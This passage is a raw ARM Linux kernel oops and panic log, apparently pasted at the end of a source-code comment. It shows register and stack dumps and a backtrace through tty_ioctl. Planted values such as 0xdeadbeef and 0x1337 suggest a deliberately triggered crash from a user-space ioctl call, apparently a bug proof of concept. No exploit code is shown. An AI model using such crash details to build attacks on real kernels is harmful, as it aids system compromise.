bf6c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000

R5: 0xe0d00780:
0780  67666564 6b6a6968 6f6e6d6c 73727170 77767574 7b7a7978 7f7e7d7c 83828180
07a0  87868584 8b8a8988 8f8e8d8c 93929190 97969594 9b9a9998 9f9e9d9c a3a2a1a0
07c0  a7a6a5a4 abaaa9a8 afaeadac b3b2b1b0 b7b6b5b4 bbbab9b8 bfbebdbc c3c2c1c0
07e0  c7c6c5c4 cbcac9c8 cfcecdcc d3d2d1d0 d7d6d5d4 dbdad9d8 dfdedddc e3e2e1e0
0800  00005401 00001337 00090f0c 00090f0c 00094438 fbfaf9f8 fffefdfc 00000000
0820  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0840  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0860  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000

R6: 0xdeadbe6f:
be6c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
be8c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
beac  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
becc  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
beec  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
bf0c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
bf2c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
bf4c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
bf6c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000

R8: 0xe0d00780:
0780  67666564 6b6a6968 6f6e6d6c 73727170 77767574 7b7a7978 7f7e7d7c 83828180
07a0  87868584 8b8a8988 8f8e8d8c 93929190 97969594 9b9a9998 9f9e9d9c a3a2a1a0
07c0  a7a6a5a4 abaaa9a8 afaeadac b3b2b1b0 b7b6b5b4 bbbab9b8 bfbebdbc c3c2c1c0
07e0  c7c6c5c4 cbcac9c8 cfcecdcc d3d2d1d0 d7d6d5d4 dbdad9d8 dfdedddc e3e2e1e0
0800  00005401 00001337 00090f0c 00090f0c 00094438 fbfaf9f8 fffefdfc 00000000
0820  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0840  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0860  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000

R9: 0xe1197f80:
7f80  e139c000 e136b780 e139c0f4 e139c0f4 00000000 00000000 00000000 00000000
7fa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
7fc0  e11977c0 000000a0 00000038 00000001 00000000 00000000 00000000 00000000
7fe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
8000  00000000 00000002 00000000 e113ec00 c049aa2c 00000000 00000015 edab4180
8020  eda50a80 e113ec00 c049cf98 e1198000 de75ec00 e113ee84 e1199d0c e1199ce8
8040  c0370eb8 00000000 00000000 00000000 00000000 00000000 01000000 00000000
8060  01f0e4c0 00000000 00000000 00000000 00000000 00000000 00000000 00000000

R10: 0xe1386700:
6700  00000000 00000000 00000000 00000020 00000000 00000000 ffffffff ffffffff
6720  00000000 00000000 00000000 00000000 e1386730 e1386730 e1386738 e1386738
6740  edfdc7d8 00000000 00000000 00000000 00000000 00000000 00000000 00000000
6760  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
6780  e1386480 e1386900 ed871e50 edd66a00 c050280c 00000001 00000802 01000003
67a0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 e176c300
67c0  00000000 00000000 00000000 00000000 00000000 00000000 ffffffff ffffffff
67e0  00000000 00000000 e1385d40 e1385d80 e13867f0 e13867f0 e13867f8 e13867f8
Process prog (pid: 253, stack limit = 0xe11982e8)
Stack: (0xe1199ea0 to 0xe119a000)
9ea0: 00000000 00000010 00000000 e7e4ac80 00000010 c0038d84 e794c0da 00000010
9ec0: ffffffff 7fffffff 00000001 c019256c ffffa72c 00000003 c0008d08 ffffffff
9ee0: 00000000 c0039ad8 ffffffff 00040257 00000000 fff00000 00000001 00000000
9f00: e1386780 bec2fc94 deadbeef 0000017b bec2fc94 c00c20c8 00002000 c00c2c14
9f20: e1199f44 00000000 00000001 c0193d00 00000000 e1198000 80000013 00000000
9f40: 00000000 00000001 00000000 ed871e50 edd66a00 e1199f3c 0002362c b6f27000
9f60: e1386780 00000000 e1386780 bec2fc94 deadbeef 0000017b e1198000 00000000
9f80: bec2f9ac c00c2cb4 0000017b 00000000 b6f27000 00000000 00000000 00000036
9fa0: c000dc04 c000da80 b6f27000 00000000 0000017b deadbeef bec2fc94 0000017b
9fc0: b6f27000 00000000 00000000 00000036 00000000 0000b430 0000b4d0 bec2f9ac
9fe0: 00000000 bec2eb8c 00009228 0002362c 80000010 0000017b 00000000 00000000
[<c01f25c8>] (tty_ioctl+0xb6c/0xc04) from [<c00c20c8>] (vfs_ioctl+0x28/0x3c)
[<c00c20c8>] (vfs_ioctl+0x28/0x3c) from [<c00c2c14>] (do_vfs_ioctl+0x548/0x5a0)
[<c00c2c14>] (do_vfs_ioctl+0x548/0x5a0) from [<c00c2cb4>] (sys_ioctl+0x48/0x70)
[<c00c2cb4>] (sys_ioctl+0x48/0x70) from [<c000da80>] (ret_fast_syscall+0x0/0x30)
Code: bad PC value
---[ end trace efa0792ca238c398 ]---
Kernel panic - not syncing: Fatal exception

*/
